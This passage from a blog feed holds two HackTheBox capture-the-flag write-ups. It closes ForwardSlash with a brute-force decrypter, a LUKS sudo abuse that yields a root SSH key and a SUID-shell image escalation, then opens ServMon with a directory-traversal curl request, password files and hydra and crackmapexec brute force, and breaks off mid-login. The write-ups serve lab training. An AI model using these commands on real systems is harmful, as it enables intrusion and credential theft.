class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> <span class="built_in">reversed</span>(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">    encrypted = content_file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rockyou.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        password = line.strip()</span><br><span class="line">        decrypted = decrypt(password, encrypted)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> string.printable <span class="keyword">for</span> c <span class="keyword">in</span> decrypted):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Key found!: &quot;</span> + password</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Decrypted ciphertext: &quot;</span> + decrypted</span><br></pre></td></tr></table></figure><p>Let’s run it and….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python decrypter.py</span><br><span class="line">[hg8@archbook ~]$ </span><br></pre></td></tr></table></figure><p>Well no results.</p><p>What could be the issue here? When reading again the crypto algorithm we notice it’s possible under certain circumstances to get non-printable characters in decrypted text. </p><p>Another point to note is that because of the algorithm, the <code>ciphertext</code> contains the same number of characters as the decrypted source. The <code>ciphertext</code> being 165 char long <code>len(encrypted)</code>, let’s tweak our <code>if</code> condition to validate a key if the output contains total of ~158 chars are printable chars. </p><p>This should be enough to bypass the accidental non printable chars being present in the decrypted text:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">def decrypt(key, msg):</span><br><span class="line">    key = list(key)</span><br><span class="line">    msg = list(msg)</span><br><span class="line">    for char_key in reversed(key):</span><br><span class="line">        for i in reversed(range(len(msg))):</span><br><span class="line">            if i == 0:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))</span><br><span class="line">            else:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))</span><br><span class="line">            while tmp &lt; 0:</span><br><span class="line">                tmp += 256</span><br><span class="line">            msg[i] = chr(tmp)</span><br><span class="line">    return &#x27;&#x27;.join(msg)</span><br><span class="line"></span><br><span class="line">with open(&#x27;ciphertext&#x27;, &#x27;r&#x27;) as content_file:</span><br><span class="line">    encrypted = content_file.read()</span><br><span class="line"></span><br><span class="line">with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        password = line.strip()</span><br><span class="line">        decrypted = decrypt(password, encrypted)</span><br><span class="line"></span><br><span class="line"><span class="addition">+        print_count = sum(c in string.printable for c in decrypted)</span></span><br><span class="line"><span class="addition">+.       if print_count &gt;= 158:</span></span><br><span class="line"><span class="deletion">-        if all(c in string.printable for c in decrypted):</span></span><br><span class="line">            print &quot;Key found!: &quot; + password</span><br><span class="line">            print &quot;Decrypted ciphertext: &quot; + decrypted</span><br></pre></td></tr></table></figure><p>Let’s give a new try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ]$ python decrypter.py</span><br><span class="line">Key found!: teamareporsiempre</span><br><span class="line">j%      9[lOyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*<span class="variable">$C2cf</span></span><br></pre></td></tr></table></figure><p>Alright we got a new password <code>cB!6%sdH8Lj^@Y*$C2cf</code> to decrypt the image located at <code>/var/backups/recovery</code>.</p><p>This explains the <code>sudo</code> entries available for <code>pain</code> user:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ sudo -l</span><br><span class="line">[...]</span><br><span class="line">User pain may run the following commands on forwardslash:</span><br><span class="line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span><br><span class="line">    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">    (root) NOPASSWD: /bin/umount ./mnt/</span><br></pre></td></tr></table></figure><h3 id="Accessing-encrypted-LUKS-image"><a href="#Accessing-encrypted-LUKS-image" class="headerlink" title="Accessing encrypted LUKS image"></a>Accessing encrypted LUKS image</h3><p>The image located in <code>/var/backups/recovery</code> is a [Linux Unified Key Setup (LUKS)](Linux Unified Key Setup) encrypted volume. Let’s decrypt it using the password we got:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ ls /var/backups/recovery/</span><br><span class="line">encrypted_backup.img</span><br><span class="line">pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> /var/backups/recovery/encrypted_backup.img</span><br><span class="line">pain@forwardslash:/$</span><br></pre></td></tr></table></figure><p>The volume should have now been mapped to <code>/dev/mapper</code>, let’s mount it to access its content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ ls -l /dev/mapper</span><br><span class="line">lrwxrwxrwx 1 root root 7 Apr  6 12:49 backup -&gt; ../dm-1</span><br><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ <span class="built_in">cd</span> mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/mnt$ ls</span><br><span class="line">id_rsa</span><br><span class="line">pain@forwardslash:/tmp/.tmp/mnt$ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK</span><br><span class="line">[...]</span><br><span class="line">ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>Well look at this! An SSH private key. Can’t dream any better :) </p><p>Let’s see if it belongs to <code>root</code> user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa root@forwardslash.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3</span><br><span class="line">root@forwardslash:~<span class="comment">#</span></span><br><span class="line">root@forwardslash:~<span class="comment"># cat root.txt</span></span><br><span class="line">5xxxxxxxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure><p>Closing note: Since the process required to mount a volume it was more important than ever to not forget cleaning after yourself, to not spoil other user and offering a “super-easy” way to root. The best way was to unmount the encrypted volume after getting the <code>id_rsa</code> and even reseting the box to make sure not forgetting anything:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/umount ./mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ <span class="built_in">cd</span> /</span><br><span class="line">pain@forwardslash:/$ rm -rf /tmp/.tmp/</span><br></pre></td></tr></table></figure><h2 id="“Unintended”-way-to-root"><a href="#“Unintended”-way-to-root" class="headerlink" title="“Unintended” way to root"></a>“Unintended” way to root</h2><p>It was also possible to access the root flag without touching the “crypto” script at all. </p><p>Indeed the following sudo configuration allow to open and mount <em>any</em> luks encrypted container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User pain may run the following commands on forwardslash:</span><br><span class="line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span><br></pre></td></tr></table></figure><p>So what does it mean ? It means that we could create, on our machine, our own container containing a SUID binary (for example) and access root this way from <code>pain</code> user. </p><p>Let’s see how it’s done.</p><p>First let’s create our container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ fallocate -l 20M sdash.img</span><br><span class="line">[hg8@archbook ~]$ sudo cryptsetup -y luksFormat sdash.img</span><br><span class="line"></span><br><span class="line">WARNING!</span><br><span class="line">========</span><br><span class="line">This will overwrite data on dash irrevocably.</span><br><span class="line"></span><br><span class="line">Are you sure? (Type <span class="string">&#x27;yes&#x27;</span> <span class="keyword">in</span> capital letters): YES</span><br><span class="line">Enter passphrase <span class="keyword">for</span> sdash.img:</span><br><span class="line">Verify passphrase:</span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>Alright, we have our container. Next step are:</p><ol><li><p>Format and mount it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo cryptsetup luksOpen ./sdash.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> ./sdash.img:</span><br><span class="line">[hg8@archbook ~]$ sudo mkfs.ext4 /dev/mapper/backup</span><br><span class="line">[hg8@archbook ~]$ mkdir mnt</span><br><span class="line">[hg8@archbook ~]$ sudo mount /dev/mapper/backup ./mnt/</span><br></pre></td></tr></table></figure></li><li><p>Putting our SUID binary in it (I will use <a href="https://en.wikipedia.org/wiki/Almquist_shell"><code>dash</code></a>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo sh -c <span class="string">&#x27;cp $(which dash) ./mnt/; chmod +s ./dash&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>Close and upload our container to the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo umount ./mnt</span><br><span class="line">[hg8@archbook ~]$ sudo cryptsetup close backup </span><br><span class="line">[hg8@archbook ~]$ scp sdash.img pain@forwardslash.htb:/tmp/.tmp/</span><br></pre></td></tr></table></figure></li></ol><p>Now let’s simply open and mount the container, the same way we saw previously for the root flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen sdash.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> dash:</span><br><span class="line">pain@forwardslash:/$ mkdir /tmp/.tmp/mnt/</span><br><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line"></span><br><span class="line">pain@forwardslash:/$ ls -l /tmp/.tmp/mnt</span><br><span class="line">total 895</span><br><span class="line">-rwsr-sr-x 1 root root 903504 Apr  6 14:25 dash</span><br><span class="line">drwx------ 2 root root  12288 Apr  6 14:24 lost+found</span><br><span class="line">pain@forwardslash:/$ ./tmp/mnt/dash</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxxxx9</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedbacks :)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> LFI </tag>
            
            <tag> forwardslash </tag>
            
            <tag> XML </tag>
            
            <tag> XXE </tag>
            
            <tag> php filter </tag>
            
            <tag> re </tag>
            
            <tag> crypto </tag>
            
            <tag> bruteforce </tag>
            
            <tag> luks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - ServMon</title>
      <link href="/posts/servmon/"/>
      <url>/posts/servmon/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="servMon-hackthebox" src="https://user-images.githubusercontent.com/9076747/82759887-5612b580-9df0-11ea-9977-182cc0df149e.png"><p>ServMon just retired on Hackthebox, it’s an easy difficulty Windows box. This was my first box ever being Windows based, it was quite new to me since I didn’t use Windows for the last 7 years. Nonetheless it was good opportunity to learn a few new tricks by getting out of my confort zone.<br>Overall quite enjoyed this box which is -in my opinion- the perfect opportunity to start on Windows based boxes.</p><p><strong>Tl;Dr:</strong> To get the user flag you had to retrieve a text file containing credentials by using a File Transversal vulnerability on a Network Surveillance software running on port 80. You then find a list of two users from an open FTP server. Using the credentials list found earlier you can brute-force one of the user (<code>Nadine</code>) password and grab the flag.<br>To get the root flag you had to exploit multiple vulnerabilities in <code>NSClient++</code> monitoring daemon to achieve Remote Code Execution as <code>root</code> and read the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.184 servmon.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC -p- servmon.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 12:02 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> servmon.htb (10.10.10.184)</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line">Not shown: 65508 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br><span class="line">22/tcp    open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp    open     http</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">445/tcp   open     microsoft-ds?</span></span><br><span class="line"><span class="string">8443/tcp  open     ssl/https-alt</span></span><br><span class="line"><span class="string">|_ http-title: NSClient++</span></span><br></pre></td></tr></table></figure><p>We have two web app running on port 80 and 8443, SMB on port 445, the FTP port 21 and finally the SSH port 22 open.</p><h3 id="FTP-anonymous-login"><a href="#FTP-anonymous-login" class="headerlink" title="FTP anonymous login"></a>FTP anonymous login</h3><p><code>nmap</code> indicate that anonymous login is possible on the FTP server running on 21. It also shows that there is an <code>Users</code> directory inside. Looks quite promising. </p><p>Let’s take a look by ourselves:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp servmon.htb</span><br><span class="line">Connected to servmon.htb.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (servmon.htb:hg8): anonymous</span><br><span class="line">331 Anonymous access allowed.</span><br><span class="line">Password:</span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; quit</span><br></pre></td></tr></table></figure><p>Alright, since we have enough permission let’s download the whole <code>Users</code> folder to browse the content more easily:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget -r ftp://anonymous:@servmon.htb/</span><br><span class="line">[hg8@archbook ~]$ tree servmon.htb</span><br><span class="line">servmon.htb</span><br><span class="line">└── Users</span><br><span class="line">    ├── Nadine</span><br><span class="line">    │   └── Confidential.txt</span><br><span class="line">    └── Nathan</span><br><span class="line">        └── Notes to do.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat <span class="string">&quot;servmon.htb/Users/Nathan/Notes to do.txt&quot;</span></span><br><span class="line">1) Change the password <span class="keyword">for</span> NVMS - Complete</span><br><span class="line">2) Lock down the NSClient Access - Complete</span><br><span class="line">3) Upload the passwords</span><br><span class="line">4) Remove public access to NVMS</span><br><span class="line">5) Place the secret files <span class="keyword">in</span> SharePoint% </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat servmon.htb/Users/Nadine/Confidential.txt</span><br><span class="line">Nathan,</span><br><span class="line"></span><br><span class="line">I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">Nadine% </span><br></pre></td></tr></table></figure><p>That’s interesting, according to Nadine there is a <code>Passwords.txt</code> file on Nathan <code>Desktop</code>. Let’s keep that in mind for later, it will probably come useful.</p><p>Now that we are done for the FTP Server let’s move on to the port 80.</p><h3 id="TVT-NVMS-1000-Directory-Traversal"><a href="#TVT-NVMS-1000-Directory-Traversal" class="headerlink" title="TVT NVMS 1000 - Directory Traversal"></a>TVT NVMS 1000 - Directory Traversal</h3><p>Opening <a href="http://servom.htb/">http://servom.htb</a> display a following login page:</p><img width="846" alt="servmon TVT NVMS login" src="https://user-images.githubusercontent.com/9076747/82762881-c70f9880-9e03-11ea-9f68-e7cf302ab5d0.png"><p>That’s an uncommon login page. A quick Google Search on <code>NVMS-1000</code> gives us the following information :</p><blockquote><p>NVMS-1000 is a monitoring client which is specially designed for network video surveillance.</p><p><a href="http://en.tvt.net.cn/products/188.html">http://en.tvt.net.cn/products/188.html</a></p></blockquote><p>As with all obscure softwares let’s check if any public exploit is available.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit <span class="string">&quot;TVT NVMS 1000&quot;</span></span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">                                                            | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line">TVT NVMS 1000 - Directory Traversal                         | exploits/hardware/webapps/48311.py</span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>That sound perfect for what we need.</p><p>Given the informations we got earlier we can probably retrieve the <code>Passwords.txt</code> file Nadine was talking about using this Directory Traversal vulnerability. </p><p>Reading the exploit code shows that we have to go back 12 levels to get to the root path. Let’s give it a try to retrieve the file located in <code>/Users/Nathan/Desktop/</code> (according to Nadine note):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i --path-as-is <span class="string">&quot;http://servmon.htb/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt&quot;</span> </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Content-Length: 156</span><br><span class="line">Connection: close</span><br><span class="line">AuthInfo:</span><br><span class="line"></span><br><span class="line">1nsp3ctTh3Way2Mars!</span><br><span class="line">Th3r34r3To0M4nyTrait0r5!</span><br><span class="line">B3WithM30r4ga1n5tMe</span><br><span class="line">L1k3B1gBut7s@W0rk</span><br><span class="line">0nly7h3y0unGWi11F0l10w</span><br><span class="line">IfH3s4b0Utg0t0H1sH0me</span><br><span class="line">Gr4etN3w5w17hMySk1Pa5$% </span><br></pre></td></tr></table></figure><p>We got a few password</p><h3 id="Nadine-account-bruteforce"><a href="#Nadine-account-bruteforce" class="headerlink" title="Nadine account bruteforce"></a>Nadine account bruteforce</h3><h4 id="SSH-brute-force"><a href="#SSH-brute-force" class="headerlink" title="SSH brute force"></a>SSH brute force</h4><p>Since SSH is open maybe one of this password will be working for <code>Nathan</code> user. Let’s use <code>hydra</code> to try brute forcing it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hydra -l Nathan -P Passwords.txt 10.10.10.184 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.10.184:22/</span><br><span class="line">1 of 1 target completed, 0 valid passwords found</span><br></pre></td></tr></table></figure><p>No luck but it’s maybe worth trying on <code>Nadine</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hydra -l Nadine -P Passwords.txt 10.10.10.184 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.10.184:22/</span><br><span class="line">[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure><p>Alright we got Nadine account password: “LikeBigButts at Work”…? Well ok why not :P </p><h4 id="SMB-bruteforce"><a href="#SMB-bruteforce" class="headerlink" title="SMB bruteforce"></a>SMB bruteforce</h4><p>Since the SMB port 445 is open it was also possible to brute-force using this entry point. For this one I will use <a href="https://github.com/byt3bl33d3r/CrackMapExec"> <code>crackmapexec</code></a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.184 -u Nadine -p Passwords.txt</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [+] ServMon\Nadine:L1k3B1gBut7s@W0rk</span><br></pre></td></tr></table></figure><p>Once again we got Nadine account credentials.</p><p>We can now connect to Nadine account trough SSH and grab the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh Nadine@servmon.htb</span><br><span class="line">Nadine@servmon.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Microsoft Windows [Version 10.0.18363.752]</span></span><br><span class="line"><span class="string">(c) 2019 Microsoft Corporation. All rights reserved.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nadine@SERVMON 